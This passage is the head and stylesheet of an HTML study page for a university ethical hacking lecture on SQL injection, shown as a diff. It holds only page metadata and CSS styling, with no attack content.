@@ -1,0 +1,1744 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, viewport-fit=cover">
+    <title>Week 4: SQL Injection — Detailed Lecture Summary</title>
+    <meta name="description" content="Comprehensive Week 4 study guide covering SQL injection types: in-band, blind, time-based, out-of-band, SQLMap automation, and remediation for CCY4202 Ethical Hacking.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+
+:root {
+    --bg-page: #090d16;
+    --bg-surface: #0f172a;
+    --bg-card: #111827;
+    --bg-card-hover: #162032;
+    --bg-sidebar: #0b1120;
+    --bg-terminal: #070a12;
+    --bg-terminal-header: #111827;
+
+    --border-subtle: rgba(255, 255, 255, 0.08);
+    --border-card: rgba(255, 255, 255, 0.1);
+    --border-hover: rgba(244, 63, 94, 0.35);
+
+    --text-primary: #f8fafc;
+    --text-secondary: #94a3b8;
+    --text-muted: #64748b;
+
+    --accent-emerald: #10b981;
+    --accent-emerald-glow: rgba(16, 185, 129, 0.2);
+    --accent-cyan: #06b6d4;
+    --accent-purple: #a855f7;
+    --accent-amber: #f59e0b;
+    --accent-rose: #f43f5e;
+    --accent-blue: #3b82f6;
+    --accent-orange: #f97316;
+
+    --font-sans: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    --font-mono: 'JetBrains Mono', 'Fira Code', Menlo, Consolas, monospace;
+
+    --shadow-card: 0 10px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
+    --shadow-glow: 0 0 20px rgba(244, 63, 94, 0.15);
+}
+
+[data-theme="light"] {
+    --bg-page: #f8fafc;
+    --bg-surface: #ffffff;
+    --bg-card: #ffffff;
+    --bg-card-hover: #f1f5f9;
+    --bg-sidebar: #f1f5f9;
+    --bg-terminal: #0f172a;
+    --bg-terminal-header: #1e293b;
+    --border-subtle: rgba(0, 0, 0, 0.08);
+    --border-card: rgba(0, 0, 0, 0.1);
+    --border-hover: rgba(220, 38, 38, 0.35);
+    --text-primary: #0f172a;
+    --text-secondary: #475569;
+    --text-muted: #94a3b8;
+    --shadow-card: 0 4px 6px -1px rgba(0, 0, 0, 0.07), 0 2px 4px -2px rgba(0, 0, 0, 0.07);
+    --shadow-glow: 0 0 15px rgba(220, 38, 38, 0.1);
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; scroll-padding-top: 80px; }
+
+body {
+    background-color: var(--bg-page);
+    color: var(--text-primary);
+    font-family: var(--font-sans);
+    line-height: 1.7;
+    font-size: 16px;
+    -webkit-font-smoothing: antialiased;
+    transition: background-color 0.25s ease, color 0.25s ease;
+}
+
+/* ── Scrollbar ─────────────────────────────────────────────────────────────── */
+::-webkit-scrollbar { width: 8px; height: 8px; }
+::-webkit-scrollbar-track { background: var(--bg-page); }
+::-webkit-scrollbar-thumb { background: var(--border-subtle); border-radius: 4px; }
+::-webkit-scrollbar-thumb:hover { background: var(--accent-rose); }
+
+/* ── Reading Progress ──────────────────────────────────────────────────────── */
+#readingProgressBar {
+    position: fixed; top: 0; left: 0; height: 3px; width: 0%;
+    background: linear-gradient(90deg, var(--accent-rose), var(--accent-amber), var(--accent-cyan));
+    z-index: 1000; transition: width 0.1s ease-out;
+}
+
+/* ── Navbar ────────────────────────────────────────────────────────────────── */
+.app-navbar {
+    position: sticky; top: 0; z-index: 900;
+    background: rgba(11, 17, 32, 0.85);
+    backdrop-filter: blur(16px);
+    -webkit-backdrop-filter: blur(16px);
+    border-bottom: 1px solid var(--border-subtle);
+    transition: background-color 0.25s ease;
+}
+[data-theme="light"] .app-navbar { background: rgba(255, 255, 255, 0.88); }
+
+.nav-container {
+    max-width: 1440px; margin: 0 auto; padding: 0 24px;
+    height: 64px; display: flex; align-items: center; justify-content: space-between;
+}
+
+.nav-brand { display: flex; align-items: center; gap: 12px; text-decoration: none; color: var(--text-primary); }
+
+.brand-icon-shield {
+    width: 36px; height: 36px; border-radius: 10px;
+    background: linear-gradient(135deg, var(--accent-rose), var(--accent-amber));
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 0 12px rgba(244, 63, 94, 0.3); color: #fff;
+}
+
+.brand-info { display: flex; flex-direction: column; }
+.brand-title { font-size: 15px; font-weight: 700; letter-spacing: -0.2px; line-height: 1.2; }
+.brand-subtitle { font-size: 11px; color: var(--text-muted); font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }
+
+.nav-actions { display: flex; align-items: center; gap: 10px; }
+
+.nav-btn {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 7px 14px; background: var(--bg-card);
+    border: 1px solid var(--border-subtle); border-radius: 8px;
+    color: var(--text-secondary); font-size: 13px; font-weight: 600;
+    font-family: inherit; cursor: pointer; transition: all 0.2s ease;
+}
+.nav-btn:hover { color: var(--text-primary); border-color: var(--accent-rose); background: var(--bg-card-hover); }
+
+.theme-toggle-btn { padding: 8px; border-radius: 8px; width: 36px; height: 36px; justify-content: center; }
+.mobile-menu-btn { display: none; padding: 8px; width: 36px; height: 36px; justify-content: center; }
+
+/* ── Layout ─────────────────────────────────────────────────────────────────── */
+.app-layout {
+    max-width: 1440px; margin: 0 auto; padding: 32px 24px;
+    display: grid; grid-template-columns: 290px 1fr; gap: 40px; align-items: start;
+}
+
+/* ── Sidebar ────────────────────────────────────────────────────────────────── */
+.sidebar-toc {
+    position: sticky; top: 96px;
+    max-height: calc(100vh - 120px); overflow-y: auto;
+    background: var(--bg-sidebar); border: 1px solid var(--border-subtle);
+    border-radius: 16px; padding: 20px;
+    display: flex; flex-direction: column;
+    box-shadow: var(--shadow-card);
+}
+
+.sidebar-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding-bottom: 14px; border-bottom: 1px solid var(--border-subtle); margin-bottom: 14px;
+}
+.sidebar-title { display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 700; color: var(--text-primary); }
+.sidebar-header-right { display: flex; align-items: center; gap: 8px; }
+.toc-badge {
+    font-size: 11px; font-weight: 700; padding: 3px 8px; border-radius: 12px;
+    background: rgba(244, 63, 94, 0.15); color: var(--accent-rose);
+    border: 1px solid rgba(244, 63, 94, 0.25);
+}
+.sidebar-close-btn {
+    display: none; width: 28px; height: 28px; border-radius: 6px;
+    background: var(--bg-card); border: 1px solid var(--border-subtle);
+    color: var(--text-muted); font-size: 14px;
+    align-items: center; justify-content: center; cursor: pointer; transition: all 0.15s ease;
+}
+.sidebar-close-btn:hover { color: var(--accent-rose); border-color: var(--accent-rose); }
+
+.sidebar-jump-box { margin-bottom: 14px; }
+.sidebar-search-btn {
+    width: 100%; display: flex; align-items: center; justify-content: space-between;
+    padding: 8px 12px; background: var(--bg-card);
+    border: 1px solid var(--border-subtle); border-radius: 8px;
+    color: var(--text-muted); font-size: 12px; cursor: pointer; font-family: inherit; transition: all 0.2s ease;
+}
+.sidebar-search-btn:hover { border-color: var(--accent-rose); color: var(--text-primary); }
+.sidebar-kbd {
+    font-size: 10px; font-family: var(--font-mono); padding: 2px 5px;
+    border-radius: 4px; background: var(--bg-surface);
+    border: 1px solid var(--border-subtle); color: var(--text-muted);
+}
+
+.toc-nav { flex: 1; }
+.toc-list { list-style: none; display: flex; flex-direction: column; gap: 4px; }
+.toc-item { border-radius: 8px; transition: background-color 0.15s ease; }
+.toc-link {
+    display: flex; align-items: center; gap: 8px; padding: 8px 10px;
+    text-decoration: none; color: var(--text-secondary);
+    font-size: 13px; font-weight: 600; border-radius: 8px; transition: all 0.15s ease;
+}
+.toc-link:hover { color: var(--text-primary); background: var(--bg-card-hover); }
+.toc-item.active > .toc-link { color: var(--accent-rose); background: rgba(244, 63, 94, 0.1); font-weight: 700; }
+.toc-icon { font-size: 14px; flex-shrink: 0; }
+.toc-num {
+    font-size: 10px; font-weight: 800; color: var(--text-muted);
+    background: var(--bg-card); padding: 2px 5px;
+    border-radius: 4px; border: 1px solid var(--border-subtle);
+}
+.toc-text { flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+.sidebar-footer { margin-top: 16px; padding-top: 14px; border-top: 1px solid var(--border-subtle); }
+.sidebar-study-card {
+    background: var(--bg-card); border: 1px solid var(--border-subtle);
+    border-radius: 10px; padding: 12px; font-size: 12px; line-height: 1.5; color: var(--text-muted);
+}
+.sidebar-study-card a { color: var(--accent-rose); text-decoration: none; font-weight: 600; }
+.sidebar-study-card a:hover { text-decoration: underline; }
+.study-card-title { font-weight: 700; color: var(--text-primary); margin-bottom: 4px; }
+
+/* ── Main Content ───────────────────────────────────────────────────────────── */
+.main-content { min-width: 0; max-width: 980px; }
+
+/* ── Hero ───────────────────────────────────────────────────────────────────── */
+.hero-section {
+    position: relative; background: var(--bg-card);
+    border: 1px solid var(--border-card); border-radius: 20px;
+    padding: 44px; margin-bottom: 36px;
+    box-shadow: var(--shadow-card); overflow: hidden;
+}
+.hero-glow {
+    position: absolute; top: -120px; right: -100px;
+    width: 380px; height: 380px; border-radius: 50%;
+    background: radial-gradient(circle, rgba(244, 63, 94, 0.18) 0%, rgba(245, 158, 11, 0.1) 50%, transparent 80%);
+    pointer-events: none;
+}
+.hero-badge-wrap { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; margin-bottom: 16px; }
+.hero-badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 4px 12px; border-radius: 20px; font-size: 11px;
+    font-weight: 800; letter-spacing: 0.5px; text-transform: uppercase;
+    background: rgba(244, 63, 94, 0.15); color: var(--accent-rose);
+    border: 1px solid rgba(244, 63, 94, 0.3);
+}
+.hero-badge.badge-secondary { background: rgba(245, 158, 11, 0.15); color: var(--accent-amber); border-color: rgba(245, 158, 11, 0.3); }
+.hero-badge.badge-lab { background: rgba(168, 85, 247, 0.15); color: var(--accent-purple); border-color: rgba(168, 85, 247, 0.3); }
+.badge-pulse {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--accent-rose); box-shadow: 0 0 8px var(--accent-rose);
+    animation: pulse 2s infinite;
+}
+@keyframes pulse {
+    0% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.4; transform: scale(0.85); }
+    100% { opacity: 1; transform: scale(1); }
+}
+.hero-title { font-size: 38px; font-weight: 800; line-height: 1.2; margin-bottom: 14px; letter-spacing: -0.8px; }
+.gradient-text {
+    background: linear-gradient(135deg, var(--accent-rose) 0%, var(--accent-amber) 100%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+}
+.hero-subtitle { font-size: 17px; color: var(--text-secondary); line-height: 1.6; margin-bottom: 24px; max-width: 820px; }
+.topic-tags-grid { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 24px; }
+.topic-tag {
+    font-size: 12px; font-weight: 600; padding: 6px 12px; border-radius: 8px;
+    background: var(--bg-surface); border: 1px solid var(--border-subtle); color: var(--text-secondary);
+}
+.guide-usage-card {
+    display: flex; align-items: flex-start; gap: 16px;
+    background: rgba(244, 63, 94, 0.06); border: 1px solid rgba(244, 63, 94, 0.25);
+    border-radius: 12px; padding: 16px 20px; margin-bottom: 28px;
+}
+.guide-usage-icon { font-size: 24px; flex-shrink: 0; line-height: 1; margin-top: 2px; }
+.guide-usage-title { font-size: 12px; font-weight: 800; letter-spacing: 0.5px; color: var(--accent-rose); margin-bottom: 4px; }
+.guide-usage-content p { font-size: 14px; color: var(--text-secondary); line-height: 1.6; }
+
+.quick-stats-bar {
+    display: flex; align-items: center; justify-content: space-around;
+    background: var(--bg-surface); border: 1px solid var(--border-subtle);
+    border-radius: 14px; padding: 16px 20px;
+}
+.stat-item { display: flex; flex-direction: column; align-items: center; gap: 2px; }
+.stat-number { font-size: 24px; font-weight: 800; color: var(--accent-rose); font-family: var(--font-mono); line-height: 1; }
+.stat-label { font-size: 11px; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
+.stat-divider { width: 1px; height: 32px; background: var(--border-subtle); }
+
+/* ── Content Cards ──────────────────────────────────────────────────────────── */
+.content-card {
+    background: var(--bg-card); border: 1px solid var(--border-card);
+    border-radius: 18px; padding: 36px; margin-bottom: 32px;
+    box-shadow: var(--shadow-card); transition: border-color 0.2s ease;
+}
+.content-card:hover { border-color: var(--border-hover); }
+
+.section-card-header {
+    display: flex; align-items: center; gap: 16px;
+    padding-bottom: 20px; margin-bottom: 26px;
+    border-bottom: 1px solid var(--border-subtle); position: relative;
+}
+.sec-num-badge {
+    width: 48px; height: 48px; border-radius: 12px;
+    background: linear-gradient(135deg, rgba(244, 63, 94, 0.2), rgba(245, 158, 11, 0.15));
+    border: 1px solid rgba(244, 63, 94, 0.4);
+    display: flex; align-items: center; justify-content: center;
+    font-family: var(--font-mono); font-size: 18px; font-weight: 800;
+    color: var(--accent-rose); flex-shrink: 0;
+}
+.sec-title-wrap { flex: 1; }
+.sec-kicker { font-size: 11px; font-weight: 800; color: var(--accent-rose); letter-spacing: 1px; text-transform: uppercase; display: block; margin-bottom: 2px; }
+.section-heading { font-size: 24px; font-weight: 800; letter-spacing: -0.4px; color: var(--text-primary); line-height: 1.3; }
+.anchor-link { color: var(--text-muted); text-decoration: none; font-size: 20px; font-weight: 600; opacity: 0; transition: opacity 0.2s ease, color 0.2s ease; }
+.section-card-header:hover .anchor-link { opacity: 1; }
+.anchor-link:hover { color: var(--accent-rose); }
+
+/* ── Typography ─────────────────────────────────────────────────────────────── */
+h3 { font-size: 18px; font-weight: 700; color: var(--text-primary); margin: 28px 0 14px 0; display: flex; align-items: center; gap: 8px; }
+h3:first-of-type { margin-top: 10px; }
+p { margin-bottom: 16px; color: var(--text-secondary); }
+strong { color: var(--text-primary); font-weight: 700; }
+em { color: var(--accent-amber); font-style: italic; }
+.icode {
+    background: rgba(244, 63, 94, 0.1); color: var(--accent-rose);
+    border: 1px solid rgba(244, 63, 94, 0.2);
+    border-radius: 5px; font-family: var(--font-mono); font-size: 0.85em; padding: 1px 6px;
+}
+[data-theme="light"] .icode { background: rgba(220, 38, 38, 0.07); color: #dc2626; border-color: rgba(220, 38, 38, 0.2); }
+
+/* ── Lists ──────────────────────────────────────────────────────────────────── */
+ul, ol { margin: 12px 0 20px 24px; color: var(--text-secondary); }
+li { margin-bottom: 8px; line-height: 1.65; }
+li::marker { color: var(--accent-rose); font-weight: 700; }
+
+/* ── Tables ─────────────────────────────────────────────────────────────────── */
+.table-responsive {
+    width: 100%; overflow-x: auto; margin: 20px 0 24px 0;
+    border-radius: 12px; border: 1px solid var(--border-subtle);
+    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.2);
+    -webkit-overflow-scrolling: touch;
+}
+table { width: 100%; border-collapse: collapse; font-size: 14px; text-align: left; }
+thead th {
+    background: var(--bg-surface); color: var(--text-primary); font-weight: 700;
+    padding: 12px 16px; border-bottom: 1px solid var(--border-subtle);
+    text-transform: uppercase; font-size: 11px; letter-spacing: 0.6px; white-space: nowrap;
+}
+tbody tr { border-bottom: 1px solid var(--border-subtle); transition: background-color 0.15s ease; }
+tbody tr:last-child { border-bottom: none; }
+tbody tr:hover { background: var(--bg-card-hover); }
+tbody td { padding: 12px 16px; color: var(--text-secondary); vertical-align: top; }
+tbody td strong { color: var(--text-primary); }
+
+/* Table row accent classes */
+.row-highlight-blue { border-left: 3px solid var(--accent-cyan); }
+.row-highlight-amber { border-left: 3px solid var(--accent-amber); }
+.row-highlight-rose { border-left: 3px solid var(--accent-rose); }
+
+/* ── Badges ─────────────────────────────────────────────────────────────────── */
+.badge { display: inline-flex; align-items: center; gap: 6px; padding: 3px 10px; border-radius: 6px; font-size: 12px; font-weight: 700; letter-spacing: 0.2px; white-space: nowrap; }
+.badge-dot { width: 6px; height: 6px; border-radius: 50%; background: currentColor; }
+.badge-scan     { background: rgba(6, 182, 212, 0.15);  color: var(--accent-cyan);   font-family: var(--font-mono); border: 1px solid rgba(6, 182, 212, 0.3); }
+.badge-active   { background: rgba(244, 63, 94, 0.15);  color: var(--accent-rose);   border: 1px solid rgba(244, 63, 94, 0.3); }
+.badge-http-200 { background: rgba(16, 185, 129, 0.15); color: var(--accent-emerald);border: 1px solid rgba(16, 185, 129, 0.3); }
+.badge-http-300 { background: rgba(59, 130, 246, 0.15); color: var(--accent-blue);   border: 1px solid rgba(59, 130, 246, 0.3); }
+.badge-http-400 { background: rgba(245, 158, 11, 0.15); color: var(--accent-amber);  border: 1px solid rgba(245, 158, 11, 0.3); }
+.badge-http-500 { background: rgba(244, 63, 94, 0.15);  color: var(--accent-rose);   border: 1px solid rgba(244, 63, 94, 0.3); }
+.badge-critical { background: rgba(244, 63, 94, 0.2);   color: var(--accent-rose);   border: 1px solid rgba(244, 63, 94, 0.4); }
+.badge-blackhat { background: #0f172a; color: #f8fafc; border: 1px solid #334155; }
+
+/* ── Terminal Cards ─────────────────────────────────────────────────────────── */
+.terminal-card {
+    background: var(--bg-terminal); border: 1px solid var(--border-subtle);
+    border-radius: 12px; margin: 18px 0 22px 0; overflow: hidden;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+}
+.terminal-header {
+    background: var(--bg-terminal-header); padding: 9px 14px;
+    display: flex; align-items: center; justify-content: space-between;
+    border-bottom: 1px solid var(--border-subtle);
+}
+.terminal-dots { display: flex; gap: 6px; }
+.dot { width: 11px; height: 11px; border-radius: 50%; }
+.dot-red { background: #ef4444; }
+.dot-yellow { background: #f59e0b; }
+.dot-green { background: #10b981; }
+.terminal-title { font-size: 12px; font-family: var(--font-mono); color: var(--text-muted); font-weight: 600; }
+.copy-btn {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 4px 10px; background: rgba(255, 255, 255, 0.06);
+    border: 1px solid var(--border-subtle); border-radius: 6px;
+    color: var(--text-secondary); font-size: 11px; font-weight: 600;
+    font-family: var(--font-sans); cursor: pointer; transition: all 0.15s ease;
+}
+.copy-btn:hover { background: rgba(244, 63, 94, 0.15); color: var(--accent-rose); border-color: rgba(244, 63, 94, 0.3); }
+.terminal-body { padding: 16px 20px; overflow-x: auto; }
+.terminal-code { font-family: var(--font-mono); font-size: 13.5px; line-height: 1.7; color: #a8d8ff; white-space: pre; }
+
+/* ── Callout Boxes ──────────────────────────────────────────────────────────── */
+.callout { display: flex; gap: 16px; border-radius: 12px; padding: 18px 20px; margin: 20px 0; border: 1px solid transparent; }
+.callout-icon { font-size: 22px; line-height: 1; flex-shrink: 0; margin-top: 2px; }
+.callout-body { flex: 1; }
+.callout-badge { font-size: 11px; font-weight: 800; letter-spacing: 0.6px; text-transform: uppercase; margin-bottom: 4px; }
+.callout-text { font-size: 14px; line-height: 1.6; color: var(--text-secondary); }
+.callout-exam     { background: rgba(245, 158, 11, 0.08); border-color: rgba(245, 158, 11, 0.3); }
+.callout-exam .callout-badge { color: var(--accent-amber); }
+.callout-principle { background: rgba(6, 182, 212, 0.08); border-color: rgba(6, 182, 212, 0.3); }
+.callout-principle .callout-badge { color: var(--accent-cyan); }
+.callout-safety   { background: rgba(244, 63, 94, 0.08); border-color: rgba(244, 63, 94, 0.3); }
+.callout-safety .callout-badge { color: var(--accent-rose); }
+.callout-lesson   { background: rgba(168, 85, 247, 0.08); border-color: rgba(168, 85, 247, 0.3); }
+.callout-lesson .callout-badge { color: var(--accent-purple); }
+
+/* ── Quiz / QA ──────────────────────────────────────────────────────────────── */
+.quiz-container {
+    margin: 24px 0; border: 1px solid var(--border-subtle);
+    border-radius: 14px; background: var(--bg-surface); overflow: hidden;
+}
+.quiz-toolbar {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 16px 20px; background: rgba(244, 63, 94, 0.07);
+    border-bottom: 1px solid var(--border-subtle);
+}
+.quiz-badge { font-size: 13px; font-weight: 800; color: var(--accent-rose); display: block; }
+.quiz-desc { font-size: 12px; color: var(--text-muted); }
+.quiz-toggle-all-btn {
+    padding: 6px 14px; background: var(--bg-card); border: 1px solid var(--border-subtle);
+    border-radius: 8px; color: var(--text-secondary); font-size: 12px; font-weight: 600;
+    cursor: pointer; font-family: inherit; transition: all 0.2s ease;
+}
+.quiz-toggle-all-btn:hover { color: var(--accent-rose); border-color: var(--accent-rose); }
+.quiz-list { display: flex; flex-direction: column; }
+
+.qa-card { border-bottom: 1px solid var(--border-subtle); }
+.qa-card:last-child { border-bottom: none; }
+.qa-header {
+    display: flex; align-items: flex-start; gap: 12px;
+    padding: 16px 20px; cursor: pointer; user-select: none;
+    transition: background-color 0.15s ease;
+}
+.qa-header:hover { background: var(--bg-card-hover); }
+.qa-num-badge {
+    width: 28px; height: 28px; border-radius: 6px;
+    background: rgba(244, 63, 94, 0.15); color: var(--accent-rose);
+    font-family: var(--font-mono); font-size: 12px; font-weight: 800;
+    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+}
+.qa-question { flex: 1; font-size: 14.5px; font-weight: 600; color: var(--text-primary); line-height: 1.5; }
+.qa-toggle-btn { background: none; border: none; color: var(--text-muted); cursor: pointer; padding: 4px; flex-shrink: 0; }
+.toggle-icon { display: inline-block; transition: transform 0.2s ease; font-size: 11px; }
+.qa-card.open .toggle-icon { transform: rotate(180deg); }
+.qa-answer { max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out; background: var(--bg-card); }
+.qa-card.open .qa-answer { max-height: 1200px; }
+.qa-answer-inner { padding: 16px 20px 20px 60px; border-top: 1px dashed var(--border-subtle); }
+.qa-ans-label { font-size: 10px; font-weight: 800; letter-spacing: 0.8px; color: var(--accent-emerald); display: block; margin-bottom: 4px; }
+.qa-answer-inner p { font-size: 14px; color: var(--text-secondary); line-height: 1.6; margin-bottom: 0; }
+
+/* ── Global Search Modal ────────────────────────────────────────────────────── */
+.search-modal-backdrop {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(6px);
+    z-index: 1100; align-items: flex-start; justify-content: center; padding-top: 100px;
+}
+.search-modal-backdrop.open { display: flex; }
+.search-modal-dialog {
+    background: var(--bg-card); border: 1px solid var(--border-card);
+    border-radius: 16px; width: 100%; max-width: 620px;
+    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); overflow: hidden;
+}
+.search-modal-header {
+    display: flex; align-items: center; gap: 12px;
+    padding: 16px 20px; border-bottom: 1px solid var(--border-subtle);
+}
+#globalSearchInput {
+    flex: 1; background: none; border: none; color: var(--text-primary);
+    font-size: 16px; font-family: inherit; outline: none;
+}
+.search-modal-close {
+    background: var(--bg-surface); border: 1px solid var(--border-subtle);
+    border-radius: 6px; color: var(--text-muted); font-size: 11px; padding: 4px 8px; cursor: pointer;
+}
+.search-results-list { max-height: 380px; overflow-y: auto; padding: 8px 12px; list-style: none; }
+.search-result-item {
+    padding: 10px 14px; border-radius: 8px; cursor: pointer;
+    display: flex; align-items: center; justify-content: space-between;
+    text-decoration: none; color: var(--text-secondary); transition: all 0.15s ease;
+}
+.search-result-item:hover, .search-result-item.highlighted { background: var(--bg-surface); color: var(--accent-rose); }
+.result-main { display: flex; flex-direction: column; }
+.result-title { font-size: 14px; font-weight: 700; color: var(--text-primary); }
+.result-sec { font-size: 11px; color: var(--text-muted); }
+.result-badge { font-size: 10px; padding: 2px 6px; border-radius: 4px; background: var(--bg-card-hover); color: var(--accent-rose); }
+
+/* ── Footer ─────────────────────────────────────────────────────────────────── */
+.app-footer {
+    max-width: 1440px; margin: 40px auto 0 auto;
+    padding: 30px 24px 60px 24px; border-top: 1px solid var(--border-subtle);
+    display: flex; align-items: center; justify-content: space-between;
+    color: var(--text-muted); font-size: 13px; flex-wrap: wrap; gap: 16px;
+}
+.footer-left { display: flex; align-items: center; gap: 10px; }
+.footer-btn {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: var(--bg-card); border: 1px solid var(--border-subtle);
+    border-radius: 8px; padding: 6px 12px; color: var(--text-secondary);
+    font-size: 12px; cursor: pointer; font-family: inherit; text-decoration: none;
+}
+.footer-btn:hover { color: var(--accent-rose); border-color: var(--accent-rose); }
+
+/* ── Sidebar backdrop ───────────────────────────────────────────────────────── */
+.sidebar-backdrop {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px); z-index: 940;
+    opacity: 0; pointer-events: none; transition: opacity 0.25s ease;
+}
+.sidebar-backdrop.active { display: block; opacity: 1; pointer-events: auto; }
+
+/* ── Mobile Floating Nav ────────────────────────────────────────────────────── */
+.mobile-floating-nav {
+    display: none; position: fixed; bottom: 24px; right: 20px;
+    z-index: 850; align-items: center; gap: 10px;
+}
+.floating-btn {
+    display: inline-flex; align-items: center; gap: 8px;
+    padding: 10px 16px; border-radius: 30px;
+    background: var(--bg-card); border: 1px solid var(--border-card);
+    color: var(--text-primary); font-size: 13px; font-weight: 700;
+    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4); cursor: pointer;
+    font-family: inherit; transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+}
+.floating-btn:hover { transform: translateY(-2px); border-color: var(--accent-rose); }
+.floating-toc-btn {
+    background: linear-gradient(135deg, rgba(244, 63, 94, 0.95), rgba(245, 158, 11, 0.95));
+    color: #fff; border: none; box-shadow: 0 8px 25px rgba(244, 63, 94, 0.35);
+}
+.floating-toc-btn:hover { box-shadow: 0 10px 30px rgba(244, 63, 94, 0.5); }
+.floating-top-btn {
+    width: 44px; height: 44px; padding: 0; justify-content: center;
+    border-radius: 50%; opacity: 0; pointer-events: none;
+    transform: scale(0.85); transition: opacity 0.2s ease, transform 0.2s ease;
+}
+.floating-top-btn.visible { opacity: 1; pointer-events: auto; transform: scale(1); }
+
+/* ── Responsive ─────────────────────────────────────────────────────────────── */
+@media (max-width: 1024px) {
+    .app-layout { grid-template-columns: 1fr; padding: 24px 20px; gap: 24px; }
+    .main-content { max-width: 100%; }
+    .sidebar-toc {
+        display: flex !important; position: fixed;
+        top: 0; left: 0; bottom: 0;
+        width: 320px; max-width: 85vw;
+        height: 100vh; max-height: 100vh;
+        z-index: 950; border-radius: 0; border: none;
+        border-right: 1px solid var(--border-subtle);
+        transform: translateX(-100%);
+        transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+        box-shadow: 15px 0 40px rgba(0, 0, 0, 0.6);
+        background: var(--bg-sidebar); padding: 20px 18px;
+    }
+    .sidebar-toc.mobile-open { transform: translateX(0); }
+    .mobile-menu-btn { display: inline-flex; }
+    .sidebar-close-btn { display: flex; }
+    .mobile-floating-nav { display: flex; }
+    .hero-section { padding: 36px 30px; }
+    .hero-title { font-size: 32px; }
+    .quick-stats-bar { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 12px; padding: 16px; }
+    .stat-divider { display: none; }
+    .stat-item { background: var(--bg-card); border: 1px solid var(--border-subtle); border-radius: 10px; padding: 10px; }
+    .content-card { padding: 28px 24px; }
+    .table-responsive { -webkit-overflow-scrolling: touch; }
+}
+
+@media (max-width: 768px) {
+    html { scroll-padding-top: 70px; }
+    .app-navbar { height: 58px; }
+    .nav-container { padding: 0 16px; height: 58px; }
+    .brand-title { font-size: 14px; }
+    .brand-subtitle { display: none; }
+    .nav-actions { gap: 8px; }
+    .nav-btn { padding: 6px 10px; font-size: 12px; }
+    .nav-btn span, .nav-btn kbd { display: none; }
+    .app-layout { padding: 16px 12px; gap: 16px; }
+    .hero-section { padding: 24px 18px; border-radius: 16px; margin-bottom: 20px; }
+    .hero-title { font-size: 26px; line-height: 1.25; margin-bottom: 12px; }
+    .hero-subtitle { font-size: 14.5px; line-height: 1.55; margin-bottom: 18px; }
+    .topic-tags-grid { gap: 6px; margin-bottom: 18px; }
+    .topic-tag { font-size: 11px; padding: 4px 9px; border-radius: 6px; }
+    .guide-usage-card { padding: 14px; gap: 12px; margin-bottom: 20px; }
+    .guide-usage-icon { font-size: 20px; }
+    .guide-usage-title { font-size: 11px; }
+    .guide-usage-content p { font-size: 13px; line-height: 1.5; }
+    .quick-stats-bar { grid-template-columns: repeat(2, 1fr); gap: 8px; padding: 10px; }
+    .stat-number { font-size: 20px; }
+    .stat-label { font-size: 10px; }
+    .content-card { padding: 20px 16px; border-radius: 14px; margin-bottom: 20px; }
+    .section-card-header { gap: 12px; padding-bottom: 14px; margin-bottom: 18px; }
+    .sec-num-badge { width: 38px; height: 38px; font-size: 15px; border-radius: 10px; }
+    .sec-kicker { font-size: 10px; }
+    .section-heading { font-size: 19px; line-height: 1.25; }
+    .anchor-link { display: none; }
+    h3 { font-size: 16.5px; margin: 22px 0 10px 0; line-height: 1.35; }
+    p { font-size: 14.5px; line-height: 1.65; margin-bottom: 14px; }
+    ul, ol { margin: 10px 0 16px 18px; font-size: 14.5px; }
+    li { margin-bottom: 6px; }
+    .table-responsive { margin: 14px 0 18px 0; border-radius: 10px; }
+    table { font-size: 12.5px; }
+    thead th { padding: 10px 12px; font-size: 10px; }
+    tbody td { padding: 10px 12px; }
+    .terminal-card { margin: 14px 0 18px 0; border-radius: 10px; }
+    .terminal-header { padding: 8px 12px; }
+    .terminal-title { font-size: 11px; }
+    .terminal-body { padding: 12px 14px; }
+    .terminal-code { font-size: 12.5px; }
+    .callout { padding: 14px; gap: 12px; margin: 16px 0; border-radius: 10px; }
+    .callout-icon { font-size: 18px; }
+    .callout-badge { font-size: 10px; }
+    .callout-text { font-size: 13px; line-height: 1.55; }
